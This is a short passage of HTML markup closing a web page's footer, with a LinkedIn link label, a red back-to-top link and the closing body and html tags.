  </span>/LinkedIn</span></a>

  <a href=""><span style="color:red;">^TOP</span></a>

</footer>

  
</body>

</html>